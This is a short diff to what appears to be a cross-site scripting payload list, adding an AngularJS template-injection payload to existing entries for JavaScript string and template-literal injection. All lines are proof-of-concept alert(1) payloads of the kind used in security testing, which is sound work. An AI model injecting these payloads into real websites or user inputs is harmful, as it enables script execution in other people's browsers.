@@ -22,3 +22,6 @@
 \";alert(1)//
 # XSS in JavaScript template literals
 ${alert(1)}
+
+# DOM XSS in AngularJS
+{{$on.constructor('alert(1)')()}}
